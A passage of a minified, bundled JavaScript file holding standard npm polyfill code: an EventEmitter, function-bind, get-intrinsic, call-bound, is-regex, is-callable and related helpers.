        typeof be == "function")
            this.removeListener(ye, be);
        else if (be !== void 0)
            for (Ae = be.length - 1; Ae >= 0; Ae--)
                this.removeListener(ye, be[Ae]);
        return this
    }
    ;
    function Q(pe, ye, be) {
        var xe = pe._events;
        if (xe === void 0)
            return [];
        var Ae = xe[ye];
        return Ae === void 0 ? [] : typeof Ae == "function" ? be ? [Ae.listener || Ae] : [Ae] : be ? oe(Ae) : ae(Ae, Ae.length)
    }
    w.prototype.listeners = function(ye) {
        return Q(this, ye, !0)
    }
    ,
    w.prototype.rawListeners = function(ye) {
        return Q(this, ye, !1)
    }
    ,
    w.listenerCount = function(pe, ye) {
        return typeof pe.listenerCount == "function" ? pe.listenerCount(ye) : ee.call(pe, ye)
    }
    ,
    w.prototype.listenerCount = ee;
    function ee(pe) {
        var ye = this._events;
        if (ye !== void 0) {
            var be = ye[pe];
            if (typeof be == "function")
                return 1;
            if (be !== void 0)
                return be.length
        }
        return 0
    }
    w.prototype.eventNames = function() {
        return this._eventsCount > 0 ? j(this._events) : []
    }
    ;
    function ae(pe, ye) {
        for (var be = new Array(ye), xe = 0; xe < ye; ++xe)
            be[xe] = pe[xe];
        return be
    }
    function ne(pe, ye) {
        for (; ye + 1 < pe.length; ye++)
            pe[ye] = pe[ye + 1];
        pe.pop()
    }
    function oe(pe) {
        for (var ye = new Array(pe.length), be = 0; be < ye.length; ++be)
            ye[be] = pe[be].listener || pe[be];
        return ye
    }
    function ue(pe, ye) {
        return new Promise(function(be, xe) {
            function Ae(Be) {
                pe.removeListener(ye, Ee),
                xe(Be)
            }
            function Ee() {
                typeof pe.removeListener == "function" && pe.removeListener("error", Ae),
                be([].slice.call(arguments))
            }
            he(pe, ye, Ee, {
                once: !0
            }),
            ye !== "error" && fe(pe, Ae, {
                once: !0
            })
        }
        )
    }
    function fe(pe, ye, be) {
        typeof pe.on == "function" && he(pe, "error", ye, be)
    }
    function he(pe, ye, be, xe) {
        if (typeof pe.on == "function")
            xe.once ? pe.once(ye, be) : pe.on(ye, be);
        else if (typeof pe.addEventListener == "function")
            pe.addEventListener(ye, function Ae(Ee) {
                xe.once && pe.removeEventListener(ye, Ae),
                be(Ee)
            });
        else
            throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof pe)
    }
    return events$1.exports
}
var streamBrowser$1, hasRequiredStreamBrowser$1;
function requireStreamBrowser$1() {
    return hasRequiredStreamBrowser$1 || (hasRequiredStreamBrowser$1 = 1,
    streamBrowser$1 = requireEvents$1().EventEmitter),
    streamBrowser$1
}
var util$3 = {}, types$1 = {}, shams$1, hasRequiredShams$1;
function requireShams$1() {
    return hasRequiredShams$1 || (hasRequiredShams$1 = 1,
    shams$1 = function() {
        if (typeof Symbol != "function" || typeof Object.getOwnPropertySymbols != "function")
            return !1;
        if (typeof Symbol.iterator == "symbol")
            return !0;
        var M = {}
          , j = Symbol("test")
          , O = Object(j);
        if (typeof j == "string" || Object.prototype.toString.call(j) !== "[object Symbol]" || Object.prototype.toString.call(O) !== "[object Symbol]")
            return !1;
        var x = 42;
        M[j] = x;
        for (var w in M)
            return !1;
        if (typeof Object.keys == "function" && Object.keys(M).length !== 0 || typeof Object.getOwnPropertyNames == "function" && Object.getOwnPropertyNames(M).length !== 0)
            return !1;
        var b = Object.getOwnPropertySymbols(M);
        if (b.length !== 1 || b[0] !== j || !Object.prototype.propertyIsEnumerable.call(M, j))
            return !1;
        if (typeof Object.getOwnPropertyDescriptor == "function") {
            var X = Object.getOwnPropertyDescriptor(M, j);
            if (X.value !== x || X.enumerable !== !0)
                return !1
        }
        return !0
    }
    ),
    shams$1
}
var shams, hasRequiredShams;
function requireShams() {
    if (hasRequiredShams)
        return shams;
    hasRequiredShams = 1;
    var _ = requireShams$1();
    return shams = function() {
        return _() && !!Symbol.toStringTag
    }
    ,
    shams
}
var esObjectAtoms, hasRequiredEsObjectAtoms;
function requireEsObjectAtoms() {
    return hasRequiredEsObjectAtoms || (hasRequiredEsObjectAtoms = 1,
    esObjectAtoms = Object),
    esObjectAtoms
}
var esErrors, hasRequiredEsErrors;
function requireEsErrors() {
    return hasRequiredEsErrors || (hasRequiredEsErrors = 1,
    esErrors = Error),
    esErrors
}
var _eval, hasRequired_eval;
function require_eval() {
    return hasRequired_eval || (hasRequired_eval = 1,
    _eval = EvalError),
    _eval
}
var range, hasRequiredRange;
function requireRange() {
    return hasRequiredRange || (hasRequiredRange = 1,
    range = RangeError),
    range
}
var ref, hasRequiredRef;
function requireRef() {
    return hasRequiredRef || (hasRequiredRef = 1,
    ref = ReferenceError),
    ref
}
var syntax, hasRequiredSyntax;
function requireSyntax() {
    return hasRequiredSyntax || (hasRequiredSyntax = 1,
    syntax = SyntaxError),
    syntax
}
var type, hasRequiredType;
function requireType() {
    return hasRequiredType || (hasRequiredType = 1,
    type = TypeError),
    type
}
var uri, hasRequiredUri;
function requireUri() {
    return hasRequiredUri || (hasRequiredUri = 1,
    uri = URIError),
    uri
}
var abs, hasRequiredAbs;
function requireAbs() {
    return hasRequiredAbs || (hasRequiredAbs = 1,
    abs = Math.abs),
    abs
}
var floor, hasRequiredFloor;
function requireFloor() {
    return hasRequiredFloor || (hasRequiredFloor = 1,
    floor = Math.floor),
    floor
}
var max, hasRequiredMax;
function requireMax() {
    return hasRequiredMax || (hasRequiredMax = 1,
    max = Math.max),
    max
}
var min, hasRequiredMin;
function requireMin() {
    return hasRequiredMin || (hasRequiredMin = 1,
    min = Math.min),
    min
}
var pow, hasRequiredPow;
function requirePow() {
    return hasRequiredPow || (hasRequiredPow = 1,
    pow = Math.pow),
    pow
}
var round, hasRequiredRound;
function requireRound() {
    return hasRequiredRound || (hasRequiredRound = 1,
    round = Math.round),
    round
}
var _isNaN, hasRequired_isNaN;
function require_isNaN() {
    return hasRequired_isNaN || (hasRequired_isNaN = 1,
    _isNaN = Number.isNaN || function(M) {
        return M !== M
    }
    ),
    _isNaN
}
var sign$1, hasRequiredSign$1;
function requireSign$1() {
    if (hasRequiredSign$1)
        return sign$1;
    hasRequiredSign$1 = 1;
    var _ = require_isNaN();
    return sign$1 = function(j) {
        return _(j) || j === 0 ? j : j < 0 ? -1 : 1
    }
    ,
    sign$1
}
var gOPD, hasRequiredGOPD;
function requireGOPD() {
    return hasRequiredGOPD || (hasRequiredGOPD = 1,
    gOPD = Object.getOwnPropertyDescriptor),
    gOPD
}
var gopd, hasRequiredGopd;
function requireGopd() {
    if (hasRequiredGopd)
        return gopd;
    hasRequiredGopd = 1;
    var _ = requireGOPD();
    if (_)
        try {
            _([], "length")
        } catch {
            _ = null
        }
    return gopd = _,
    gopd
}
var esDefineProperty, hasRequiredEsDefineProperty;
function requireEsDefineProperty() {
    if (hasRequiredEsDefineProperty)
        return esDefineProperty;
    hasRequiredEsDefineProperty = 1;
    var _ = Object.defineProperty || !1;
    if (_)
        try {
            _({}, "a", {
                value: 1
            })
        } catch {
            _ = !1
        }
    return esDefineProperty = _,
    esDefineProperty
}
var hasSymbols, hasRequiredHasSymbols;
function requireHasSymbols() {
    if (hasRequiredHasSymbols)
        return hasSymbols;
    hasRequiredHasSymbols = 1;
    var _ = typeof Symbol < "u" && Symbol
      , M = requireShams$1();
    return hasSymbols = function() {
        return typeof _ != "function" || typeof Symbol != "function" || typeof _("foo") != "symbol" || typeof Symbol("bar") != "symbol" ? !1 : M()
    }
    ,
    hasSymbols
}
var Reflect_getPrototypeOf, hasRequiredReflect_getPrototypeOf;
function requireReflect_getPrototypeOf() {
    return hasRequiredReflect_getPrototypeOf || (hasRequiredReflect_getPrototypeOf = 1,
    Reflect_getPrototypeOf = typeof Reflect < "u" && Reflect.getPrototypeOf || null),
    Reflect_getPrototypeOf
}
var Object_getPrototypeOf, hasRequiredObject_getPrototypeOf;
function requireObject_getPrototypeOf() {
    if (hasRequiredObject_getPrototypeOf)
        return Object_getPrototypeOf;
    hasRequiredObject_getPrototypeOf = 1;
    var _ = requireEsObjectAtoms();
    return Object_getPrototypeOf = _.getPrototypeOf || null,
    Object_getPrototypeOf
}
var implementation$4, hasRequiredImplementation$4;
function requireImplementation$4() {
    if (hasRequiredImplementation$4)
        return implementation$4;
    hasRequiredImplementation$4 = 1;
    var _ = "Function.prototype.bind called on incompatible "
      , M = Object.prototype.toString
      , j = Math.max
      , O = "[object Function]"
      , x = function(Y, F) {
        for (var V = [], K = 0; K < Y.length; K += 1)
            V[K] = Y[K];
        for (var Q = 0; Q < F.length; Q += 1)
            V[Q + Y.length] = F[Q];
        return V
    }
      , w = function(Y, F) {
        for (var V = [], K = F, Q = 0; K < Y.length; K += 1,
        Q += 1)
            V[Q] = Y[K];
        return V
    }
      , b = function(X, Y) {
        for (var F = "", V = 0; V < X.length; V += 1)
            F += X[V],
            V + 1 < X.length && (F += Y);
        return F
    };
    return implementation$4 = function(Y) {
        var F = this;
        if (typeof F != "function" || M.apply(F) !== O)
            throw new TypeError(_ + F);
        for (var V = w(arguments, 1), K, Q = function() {
            if (this instanceof K) {
                var ue = F.apply(this, x(V, arguments));
                return Object(ue) === ue ? ue : this
            }
            return F.apply(Y, x(V, arguments))
        }, ee = j(0, F.length - V.length), ae = [], ne = 0; ne < ee; ne++)
            ae[ne] = "$" + ne;
        if (K = Function("binder", "return function (" + b(ae, ",") + "){ return binder.apply(this,arguments); }")(Q),
        F.prototype) {
            var oe = function() {};
            oe.prototype = F.prototype,
            K.prototype = new oe,
            oe.prototype = null
        }
        return K
    }
    ,
    implementation$4
}
var functionBind, hasRequiredFunctionBind;
function requireFunctionBind() {
    if (hasRequiredFunctionBind)
        return functionBind;
    hasRequiredFunctionBind = 1;
    var _ = requireImplementation$4();
    return functionBind = Function.prototype.bind || _,
    functionBind
}
var functionCall, hasRequiredFunctionCall;
function requireFunctionCall() {
    return hasRequiredFunctionCall || (hasRequiredFunctionCall = 1,
    functionCall = Function.prototype.call),
    functionCall
}
var functionApply, hasRequiredFunctionApply;
function requireFunctionApply() {
    return hasRequiredFunctionApply || (hasRequiredFunctionApply = 1,
    functionApply = Function.prototype.apply),
    functionApply
}
var reflectApply, hasRequiredReflectApply;
function requireReflectApply() {
    return hasRequiredReflectApply || (hasRequiredReflectApply = 1,
    reflectApply = typeof Reflect < "u" && Reflect && Reflect.apply),
    reflectApply
}
var actualApply, hasRequiredActualApply;
function requireActualApply() {
    if (hasRequiredActualApply)
        return actualApply;
    hasRequiredActualApply = 1;
    var _ = requireFunctionBind()
      , M = requireFunctionApply()
      , j = requireFunctionCall()
      , O = requireReflectApply();
    return actualApply = O || _.call(j, M),
    actualApply
}
var callBindApplyHelpers, hasRequiredCallBindApplyHelpers;
function requireCallBindApplyHelpers() {
    if (hasRequiredCallBindApplyHelpers)
        return callBindApplyHelpers;
    hasRequiredCallBindApplyHelpers = 1;
    var _ = requireFunctionBind()
      , M = requireType()
      , j = requireFunctionCall()
      , O = requireActualApply();
    return callBindApplyHelpers = function(w) {
        if (w.length < 1 || typeof w[0] != "function")
            throw new M("a function is required");
        return O(_, j, w)
    }
    ,
    callBindApplyHelpers
}
var get, hasRequiredGet$1;
function requireGet$1() {
    if (hasRequiredGet$1)
        return get;
    hasRequiredGet$1 = 1;
    var _ = requireCallBindApplyHelpers(), M = requireGopd(), j;
    try {
        j = [].__proto__ === Array.prototype
    } catch (b) {
        if (!b || typeof b != "object" || !("code"in b) || b.code !== "ERR_PROTO_ACCESS")
            throw b
    }
    var O = !!j && M && M(Object.prototype, "__proto__")
      , x = Object
      , w = x.getPrototypeOf;
    return get = O && typeof O.get == "function" ? _([O.get]) : typeof w == "function" ? function(X) {
        return w(X == null ? X : x(X))
    }
    : !1,
    get
}
var getProto, hasRequiredGetProto;
function requireGetProto() {
    if (hasRequiredGetProto)
        return getProto;
    hasRequiredGetProto = 1;
    var _ = requireReflect_getPrototypeOf()
      , M = requireObject_getPrototypeOf()
      , j = requireGet$1();
    return getProto = _ ? function(x) {
        return _(x)
    }
    : M ? function(x) {
        if (!x || typeof x != "object" && typeof x != "function")
            throw new TypeError("getProto: not an object");
        return M(x)
    }
    : j ? function(x) {
        return j(x)
    }
    : null,
    getProto
}
var hasown, hasRequiredHasown;
function requireHasown() {
    if (hasRequiredHasown)
        return hasown;
    hasRequiredHasown = 1;
    var _ = Function.prototype.call
      , M = Object.prototype.hasOwnProperty
      , j = requireFunctionBind();
    return hasown = j.call(_, M),
    hasown
}
var getIntrinsic, hasRequiredGetIntrinsic;
function requireGetIntrinsic() {
    if (hasRequiredGetIntrinsic)
        return getIntrinsic;
    hasRequiredGetIntrinsic = 1;
    var _, M = requireEsObjectAtoms(), j = requireEsErrors(), O = require_eval(), x = requireRange(), w = requireRef(), b = requireSyntax(), X = requireType(), Y = requireUri(), F = requireAbs(), V = requireFloor(), K = requireMax(), Q = requireMin(), ee = requirePow(), ae = requireRound(), ne = requireSign$1(), oe = Function, ue = function(Ze) {
        try {
            return oe('"use strict"; return (' + Ze + ").constructor;")()
        } catch {}
    }, fe = requireGopd(), he = requireEsDefineProperty(), pe = function() {
        throw new X
    }, ye = fe ? function() {
        try {
            return arguments.callee,
            pe
        } catch {
            try {
                return fe(arguments, "callee").get
            } catch {
                return pe
            }
        }
    }() : pe, be = requireHasSymbols()(), xe = requireGetProto(), Ae = requireObject_getPrototypeOf(), Ee = requireReflect_getPrototypeOf(), Be = requireFunctionApply(), ce = requireFunctionCall(), q = {}, L = typeof Uint8Array > "u" || !xe ? _ : xe(Uint8Array), U = {
        __proto__: null,
        "%AggregateError%": typeof AggregateError > "u" ? _ : AggregateError,
        "%Array%": Array,
        "%ArrayBuffer%": typeof ArrayBuffer > "u" ? _ : ArrayBuffer,
        "%ArrayIteratorPrototype%": be && xe ? xe([][Symbol.iterator]()) : _,
        "%AsyncFromSyncIteratorPrototype%": _,
        "%AsyncFunction%": q,
        "%AsyncGenerator%": q,
        "%AsyncGeneratorFunction%": q,
        "%AsyncIteratorPrototype%": q,
        "%Atomics%": typeof Atomics > "u" ? _ : Atomics,
        "%BigInt%": typeof BigInt > "u" ? _ : BigInt,
        "%BigInt64Array%": typeof BigInt64Array > "u" ? _ : BigInt64Array,
        "%BigUint64Array%": typeof BigUint64Array > "u" ? _ : BigUint64Array,
        "%Boolean%": Boolean,
        "%DataView%": typeof DataView > "u" ? _ : DataView,
        "%Date%": Date,
        "%decodeURI%": decodeURI,
        "%decodeURIComponent%": decodeURIComponent,
        "%encodeURI%": encodeURI,
        "%encodeURIComponent%": encodeURIComponent,
        "%Error%": j,
        "%eval%": eval,
        "%EvalError%": O,
        "%Float16Array%": typeof Float16Array > "u" ? _ : Float16Array,
        "%Float32Array%": typeof Float32Array > "u" ? _ : Float32Array,
        "%Float64Array%": typeof Float64Array > "u" ? _ : Float64Array,
        "%FinalizationRegistry%": typeof FinalizationRegistry > "u" ? _ : FinalizationRegistry,
        "%Function%": oe,
        "%GeneratorFunction%": q,
        "%Int8Array%": typeof Int8Array > "u" ? _ : Int8Array,
        "%Int16Array%": typeof Int16Array > "u" ? _ : Int16Array,
        "%Int32Array%": typeof Int32Array > "u" ? _ : Int32Array,
        "%isFinite%": isFinite,
        "%isNaN%": isNaN,
        "%IteratorPrototype%": be && xe ? xe(xe([][Symbol.iterator]())) : _,
        "%JSON%": typeof JSON == "object" ? JSON : _,
        "%Map%": typeof Map > "u" ? _ : Map,
        "%MapIteratorPrototype%": typeof Map > "u" || !be || !xe ? _ : xe(new Map()[Symbol.iterator]()),
        "%Math%": Math,
        "%Number%": Number,
        "%Object%": M,
        "%Object.getOwnPropertyDescriptor%": fe,
        "%parseFloat%": parseFloat,
        "%parseInt%": parseInt,
        "%Promise%": typeof Promise > "u" ? _ : Promise,
        "%Proxy%": typeof Proxy > "u" ? _ : Proxy,
        "%RangeError%": x,
        "%ReferenceError%": w,
        "%Reflect%": typeof Reflect > "u" ? _ : Reflect,
        "%RegExp%": RegExp,
        "%Set%": typeof Set > "u" ? _ : Set,
        "%SetIteratorPrototype%": typeof Set > "u" || !be || !xe ? _ : xe(new Set()[Symbol.iterator]()),
        "%SharedArrayBuffer%": typeof SharedArrayBuffer > "u" ? _ : SharedArrayBuffer,
        "%String%": String,
        "%StringIteratorPrototype%": be && xe ? xe(""[Symbol.iterator]()) : _,
        "%Symbol%": be ? Symbol : _,
        "%SyntaxError%": b,
        "%ThrowTypeError%": ye,
        "%TypedArray%": L,
        "%TypeError%": X,
        "%Uint8Array%": typeof Uint8Array > "u" ? _ : Uint8Array,
        "%Uint8ClampedArray%": typeof Uint8ClampedArray > "u" ? _ : Uint8ClampedArray,
        "%Uint16Array%": typeof Uint16Array > "u" ? _ : Uint16Array,
        "%Uint32Array%": typeof Uint32Array > "u" ? _ : Uint32Array,
        "%URIError%": Y,
        "%WeakMap%": typeof WeakMap > "u" ? _ : WeakMap,
        "%WeakRef%": typeof WeakRef > "u" ? _ : WeakRef,
        "%WeakSet%": typeof WeakSet > "u" ? _ : WeakSet,
        "%Function.prototype.call%": ce,
        "%Function.prototype.apply%": Be,
        "%Object.defineProperty%": he,
        "%Object.getPrototypeOf%": Ae,
        "%Math.abs%": F,
        "%Math.floor%": V,
        "%Math.max%": K,
        "%Math.min%": Q,
        "%Math.pow%": ee,
        "%Math.round%": ae,
        "%Math.sign%": ne,
        "%Reflect.getPrototypeOf%": Ee
    };
    if (xe)
        try {
            null.error
        } catch (Ze) {
            var Z = xe(xe(Ze));
            U["%Error.prototype%"] = Z
        }
    var te = function Ze($e) {
        var Ne;
        if ($e === "%AsyncFunction%")
            Ne = ue("async function () {}");
        else if ($e === "%GeneratorFunction%")
            Ne = ue("function* () {}");
        else if ($e === "%AsyncGeneratorFunction%")
            Ne = ue("async function* () {}");
        else if ($e === "%AsyncGenerator%") {
            var qe = Ze("%AsyncGeneratorFunction%");
            qe && (Ne = qe.prototype)
        } else if ($e === "%AsyncIteratorPrototype%") {
            var Ve = Ze("%AsyncGenerator%");
            Ve && xe && (Ne = xe(Ve.prototype))
        }
        return U[$e] = Ne,
        Ne
    }
      , se = {
        __proto__: null,
        "%ArrayBufferPrototype%": ["ArrayBuffer", "prototype"],
        "%ArrayPrototype%": ["Array", "prototype"],
        "%ArrayProto_entries%": ["Array", "prototype", "entries"],
        "%ArrayProto_forEach%": ["Array", "prototype", "forEach"],
        "%ArrayProto_keys%": ["Array", "prototype", "keys"],
        "%ArrayProto_values%": ["Array", "prototype", "values"],
        "%AsyncFunctionPrototype%": ["AsyncFunction", "prototype"],
        "%AsyncGenerator%": ["AsyncGeneratorFunction", "prototype"],
        "%AsyncGeneratorPrototype%": ["AsyncGeneratorFunction", "prototype", "prototype"],
        "%BooleanPrototype%": ["Boolean", "prototype"],
        "%DataViewPrototype%": ["DataView", "prototype"],
        "%DatePrototype%": ["Date", "prototype"],
        "%ErrorPrototype%": ["Error", "prototype"],
        "%EvalErrorPrototype%": ["EvalError", "prototype"],
        "%Float32ArrayPrototype%": ["Float32Array", "prototype"],
        "%Float64ArrayPrototype%": ["Float64Array", "prototype"],
        "%FunctionPrototype%": ["Function", "prototype"],
        "%Generator%": ["GeneratorFunction", "prototype"],
        "%GeneratorPrototype%": ["GeneratorFunction", "prototype", "prototype"],
        "%Int8ArrayPrototype%": ["Int8Array", "prototype"],
        "%Int16ArrayPrototype%": ["Int16Array", "prototype"],
        "%Int32ArrayPrototype%": ["Int32Array", "prototype"],
        "%JSONParse%": ["JSON", "parse"],
        "%JSONStringify%": ["JSON", "stringify"],
        "%MapPrototype%": ["Map", "prototype"],
        "%NumberPrototype%": ["Number", "prototype"],
        "%ObjectPrototype%": ["Object", "prototype"],
        "%ObjProto_toString%": ["Object", "prototype", "toString"],
        "%ObjProto_valueOf%": ["Object", "prototype", "valueOf"],
        "%PromisePrototype%": ["Promise", "prototype"],
        "%PromiseProto_then%": ["Promise", "prototype", "then"],
        "%Promise_all%": ["Promise", "all"],
        "%Promise_reject%": ["Promise", "reject"],
        "%Promise_resolve%": ["Promise", "resolve"],
        "%RangeErrorPrototype%": ["RangeError", "prototype"],
        "%ReferenceErrorPrototype%": ["ReferenceError", "prototype"],
        "%RegExpPrototype%": ["RegExp", "prototype"],
        "%SetPrototype%": ["Set", "prototype"],
        "%SharedArrayBufferPrototype%": ["SharedArrayBuffer", "prototype"],
        "%StringPrototype%": ["String", "prototype"],
        "%SymbolPrototype%": ["Symbol", "prototype"],
        "%SyntaxErrorPrototype%": ["SyntaxError", "prototype"],
        "%TypedArrayPrototype%": ["TypedArray", "prototype"],
        "%TypeErrorPrototype%": ["TypeError", "prototype"],
        "%Uint8ArrayPrototype%": ["Uint8Array", "prototype"],
        "%Uint8ClampedArrayPrototype%": ["Uint8ClampedArray", "prototype"],
        "%Uint16ArrayPrototype%": ["Uint16Array", "prototype"],
        "%Uint32ArrayPrototype%": ["Uint32Array", "prototype"],
        "%URIErrorPrototype%": ["URIError", "prototype"],
        "%WeakMapPrototype%": ["WeakMap", "prototype"],
        "%WeakSetPrototype%": ["WeakSet", "prototype"]
    }
      , de = requireFunctionBind()
      , re = requireHasown()
      , $ = de.call(ce, Array.prototype.concat)
      , ie = de.call(Be, Array.prototype.splice)
      , ve = de.call(ce, String.prototype.replace)
      , ge = de.call(ce, String.prototype.slice)
      , Re = de.call(ce, RegExp.prototype.exec)
      , Pe = /[^%.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|%$))/g
      , Ie = /\\(\\)?/g
      , Te = function($e) {
        var Ne = ge($e, 0, 1)
          , qe = ge($e, -1);
        if (Ne === "%" && qe !== "%")
            throw new b("invalid intrinsic syntax, expected closing `%`");
        if (qe === "%" && Ne !== "%")
            throw new b("invalid intrinsic syntax, expected opening `%`");
        var Ve = [];
        return ve($e, Pe, function(lt, nt, je, Ke) {
            Ve[Ve.length] = je ? ve(Ke, Ie, "$1") : nt || lt
        }),
        Ve
    }
      , Le = function($e, Ne) {
        var qe = $e, Ve;
        if (re(se, qe) && (Ve = se[qe],
        qe = "%" + Ve[0] + "%"),
        re(U, qe)) {
            var lt = U[qe];
            if (lt === q && (lt = te(qe)),
            typeof lt > "u" && !Ne)
                throw new X("intrinsic " + $e + " exists, but is not available. Please file an issue!");
            return {
                alias: Ve,
                name: qe,
                value: lt
            }
        }
        throw new b("intrinsic " + $e + " does not exist!")
    };
    return getIntrinsic = function($e, Ne) {
        if (typeof $e != "string" || $e.length === 0)
            throw new X("intrinsic name must be a non-empty string");
        if (arguments.length > 1 && typeof Ne != "boolean")
            throw new X('"allowMissing" argument must be a boolean');
        if (Re(/^%?[^%]*%?$/, $e) === null)
            throw new b("`%` may not be present anywhere but at the beginning and end of the intrinsic name");
        var qe = Te($e)
          , Ve = qe.length > 0 ? qe[0] : ""
          , lt = Le("%" + Ve + "%", Ne)
          , nt = lt.name
          , je = lt.value
          , Ke = !1
          , Qe = lt.alias;
        Qe && (Ve = Qe[0],
        ie(qe, $([0, 1], Qe)));
        for (var We = 1, mt = !0; We < qe.length; We += 1) {
            var ct = qe[We]
              , vt = ge(ct, 0, 1)
              , we = ge(ct, -1);
            if ((vt === '"' || vt === "'" || vt === "`" || we === '"' || we === "'" || we === "`") && vt !== we)
                throw new b("property names with quotes must have matching quotes");
            if ((ct === "constructor" || !mt) && (Ke = !0),
            Ve += "." + ct,
            nt = "%" + Ve + "%",
            re(U, nt))
                je = U[nt];
            else if (je != null) {
                if (!(ct in je)) {
                    if (!Ne)
                        throw new X("base intrinsic for " + $e + " exists, but the property is not available.");
                    return
                }
                if (fe && We + 1 >= qe.length) {
                    var _e = fe(je, ct);
                    mt = !!_e,
                    mt && "get"in _e && !("originalValue"in _e.get) ? je = _e.get : je = je[ct]
                } else
                    mt = re(je, ct),
                    je = je[ct];
                mt && !Ke && (U[nt] = je)
            }
        }
        return je
    }
    ,
    getIntrinsic
}
var callBound$1, hasRequiredCallBound$1;
function requireCallBound$1() {
    if (hasRequiredCallBound$1)
        return callBound$1;
    hasRequiredCallBound$1 = 1;
    var _ = requireGetIntrinsic()
      , M = requireCallBindApplyHelpers()
      , j = M([_("%String.prototype.indexOf%")]);
    return callBound$1 = function(x, w) {
        var b = _(x, !!w);
        return typeof b == "function" && j(x, ".prototype.") > -1 ? M([b]) : b
    }
    ,
    callBound$1
}
var isArguments$1, hasRequiredIsArguments$2;
function requireIsArguments$2() {
    if (hasRequiredIsArguments$2)
        return isArguments$1;
    hasRequiredIsArguments$2 = 1;
    var _ = requireShams()()
      , M = requireCallBound$1()
      , j = M("Object.prototype.toString")
      , O = function(X) {
        return _ && X && typeof X == "object" && Symbol.toStringTag in X ? !1 : j(X) === "[object Arguments]"
    }
      , x = function(X) {
        return O(X) ? !0 : X !== null && typeof X == "object" && "length"in X && typeof X.length == "number" && X.length >= 0 && j(X) !== "[object Array]" && "callee"in X && j(X.callee) === "[object Function]"
    }
      , w = function() {
        return O(arguments)
    }();
    return O.isLegacyArguments = x,
    isArguments$1 = w ? O : x,
    isArguments$1
}
var isRegex, hasRequiredIsRegex;
function requireIsRegex() {
    if (hasRequiredIsRegex)
        return isRegex;
    hasRequiredIsRegex = 1;
    var _ = requireCallBound$1(), M = requireShams()(), j = requireHasown(), O = requireGopd(), x;
    if (M) {
        var w = _("RegExp.prototype.exec")
          , b = {}
          , X = function() {
            throw b
        }
          , Y = {
            toString: X,
            valueOf: X
        };
        typeof Symbol.toPrimitive == "symbol" && (Y[Symbol.toPrimitive] = X),
        x = function(Q) {
            if (!Q || typeof Q != "object")
                return !1;
            var ee = O(Q, "lastIndex")
              , ae = ee && j(ee, "value");
            if (!ae)
                return !1;
            try {
                w(Q, Y)
            } catch (ne) {
                return ne === b
            }
        }
    } else {
        var F = _("Object.prototype.toString")
          , V = "[object RegExp]";
        x = function(Q) {
            return !Q || typeof Q != "object" && typeof Q != "function" ? !1 : F(Q) === V
        }
    }
    return isRegex = x,
    isRegex
}
var safeRegexTest, hasRequiredSafeRegexTest;
function requireSafeRegexTest() {
    if (hasRequiredSafeRegexTest)
        return safeRegexTest;
    hasRequiredSafeRegexTest = 1;
    var _ = requireCallBound$1()
      , M = requireIsRegex()
      , j = _("RegExp.prototype.exec")
      , O = requireType();
    return safeRegexTest = function(w) {
        if (!M(w))
            throw new O("`regex` must be a RegExp");
        return function(X) {
            return j(w, X) !== null
        }
    }
    ,
    safeRegexTest
}
var isGeneratorFunction, hasRequiredIsGeneratorFunction;
function requireIsGeneratorFunction() {
    if (hasRequiredIsGeneratorFunction)
        return isGeneratorFunction;
    hasRequiredIsGeneratorFunction = 1;
    var _ = requireCallBound$1(), M = requireSafeRegexTest(), j = M(/^\s*(?:function)?\*/), O = requireShams()(), x = requireGetProto(), w = _("Object.prototype.toString"), b = _("Function.prototype.toString"), X = function() {
        if (!O)
            return !1;
        try {
            return Function("return function*() {}")()
        } catch {}
    }, Y;
    return isGeneratorFunction = function(V) {
        if (typeof V != "function")
            return !1;
        if (j(b(V)))
            return !0;
        if (!O) {
            var K = w(V);
            return K === "[object GeneratorFunction]"
        }
        if (!x)
            return !1;
        if (typeof Y > "u") {
            var Q = X();
            Y = Q ? x(Q) : !1
        }
        return x(V) === Y
    }
    ,
    isGeneratorFunction
}
var isCallable, hasRequiredIsCallable;
function requireIsCallable() {
    if (hasRequiredIsCallable)
        return isCallable;
    hasRequiredIsCallable = 1;
    var _ = Function.prototype.toString, M = typeof Reflect == "object" && Reflect !== null && Reflect.apply, j, O;
    if (typeof M == "function" && typeof Object.defineProperty == "function")
        try {
            j = Object.defineProperty({}, "length", {
                get: function() {
                    throw O
                }
            }),
            O = {},
            M(function() {
                throw 42
            }, null, j)
        } catch (fe) {
            fe !== O && (M = null)
        }
    else
        M = null;
    var x = /^\s*class\b/
      , w = function(he) {
        try {
            var pe = _.call(he);
            return x.test(pe)
        } catch {
            return !1
        }
    }
      , b = function(he) {
        try {
            return w(he) ? !1 : (_.call(he),
            !0)
        } catch {
            return !1
        }
    }
      , X = Object.prototype.toString
      , Y = "[object Object]"
      , F = "[object Function]"
      , V = "[object GeneratorFunction]"
      , K = "[object HTMLAllCollection]"
      , Q = "[object HTML document.all class]"
      , ee = "[object HTMLCollection]"
      , ae = typeof Symbol == "function" && !!Symbol.toStringTag
      , ne = !(0 in [, ])
      , oe = function() {
        return !1
    };
    if (typeof document == "object") {
        var ue = document.all;
        X.call(ue) === X.call(document.all) && (oe = function(he) {
            if ((ne || !he) && (typeof he > "u" || typeof he == "object"))
                try {
                    var pe = X.call(he);
                    return (pe === K || pe === Q || pe === ee || pe === Y) && he("") == null
                } catch {}
            return !1
        }
        )
    }
    return isCallable = M ? function(he) {
        if (oe(he))
            return !0;
        if (!he || typeof he != "function" && typeof he != "object")
            return !1;
        try {
            M(he, null, j)
        } catch (pe) {
            if (pe !== O)
                return !1
        }
        return !w(he) && b(he)
    }
    : function(he) {
        if (oe(he))
            return !0;
        if (!he || typeof he != "function" && typeof he != "object")
            return !1;
        if (ae)
            return b(he);
        if (w(he))
            return !1;
        var pe = X.call(he);
        return pe !== F && pe !== V && !/^\[object HTML/.test(pe) ? !1 : b(he)
    }
    ,
    isCallable
}
var forEach$1, hasRequiredForEach$1;
function requireForEach$1() {
    if (hasRequiredForEach$1)
        return forEach$1;
    hasRequiredForEach$1 = 1;
    var _ = requireIsCallable()
      , M = Object.prototype.toString
      , j = Object.prototype.hasOwnProperty
      , O = function(Y, F, V) {
        for (var K = 0, Q = Y.length; K < Q; K++)
            j.call(Y, K) && (V == null ? F(Y[K], K, Y) : F.call(V, Y[K], K, Y))
    }
      , x = function(Y, F, V) {
        for (var K = 0, Q = Y.length; K < Q; K++)
            V == null ? F(Y.charAt(K), K, Y) : F.call(V, Y.charAt(K), K, Y)
    }
